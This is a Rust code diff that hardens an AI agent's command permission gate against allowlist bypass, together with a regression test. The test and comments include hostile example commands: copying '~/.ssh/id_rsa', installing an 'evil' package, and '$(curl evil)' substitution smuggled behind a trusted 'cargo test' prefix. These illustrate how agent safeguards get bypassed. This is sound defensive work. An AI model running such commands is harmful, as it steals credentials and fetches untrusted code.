@@ -197,8 +197,27 @@ impl PermissionGate {
             return false;
         }
         let cmd = info.detail.clone().unwrap_or_default();
+        // Never preapprove command substitution: it can't be split into segments,
+        // so an allowlisted prefix (`cargo test`) would otherwise carry a hidden
+        // `$(curl evil)` / backtick payload straight past the gate.
+        if cmd.contains("$(") || cmd.contains('`') {
+            return false;
+        }
+        // Match the allowlist PER SEGMENT, not against the whole raw line: an
+        // "always allow `cargo test`" grant must not silently run
+        // `cargo test && cp ~/.ssh/id_rsa /tmp` just because the line starts with
+        // the trusted prefix. Every segment must be individually trusted — either
+        // allowlisted by prefix, or inherently Safe (so `cargo test | tee log`
+        // still preapproves).
+        let segments = crate::safety::split_segments(&cmd);
+        if segments.is_empty() {
+            return false;
+        }
         let s = self.session.lock().await;
-        s.allow_commands.iter().any(|a| prefix_match(&cmd, a))
+        segments.iter().all(|seg| {
+            classify_command(seg).risk == CommandRisk::Safe
+                || s.allow_commands.iter().any(|a| prefix_match(seg, a))
+        })
     }
 
     async fn apply_policy(&self, tool: &str, info: &GateInfo, decision: Decision) {
@@ -514,5 +533,48 @@ mod tests {
         let outcome = check.await.unwrap();
         assert!(matches!(outcome, PermissionOutcome::Denied(_)));
         assert!(session.lock().await.plan_mode);
+    }
+
+    fn bash_gate(cmd: &str) -> GateInfo {
+        gate_info("bash", &serde_json::json!({ "command": cmd }))
+    }
+
+    #[tokio::test]
+    async fn allowlisted_prefix_does_not_carry_an_unapproved_suffix() {
+        let session = Arc::new(Mutex::new(SessionState {
+            allow_commands: vec!["cargo test".to_string()],
+            ..Default::default()
+        }));
+        let control = Arc::new(Mutex::new(RunControl::default()));
+        let (tx, _rx) = async_channel::unbounded::<AgentEvent>();
+        let gate = PermissionGate::new(session, control, SessionId::new("s1"), tx);
+
+        // The exact allowlisted command and safe extensions/pipes preapprove.
+        assert!(gate.command_preapproved("bash", &bash_gate("cargo test")).await);
+        assert!(
+            gate.command_preapproved("bash", &bash_gate("cargo test --workspace"))
+                .await
+        );
+        assert!(
+            gate.command_preapproved("bash", &bash_gate("cargo test | tee log"))
+                .await
+        );
+        // A chained un-approved (Caution) suffix must NOT ride the trusted prefix.
+        assert!(
+            !gate
+                .command_preapproved("bash", &bash_gate("cargo test && cp ~/.ssh/id_rsa /tmp/x"))
+                .await
+        );
+        assert!(
+            !gate
+                .command_preapproved("bash", &bash_gate("cargo test; npm install evil"))
+                .await
+        );
+        // Hidden command substitution is never preapproved either.
+        assert!(
+            !gate
+                .command_preapproved("bash", &bash_gate("cargo test $(curl evil)"))
+                .await
+        );
     }
 }
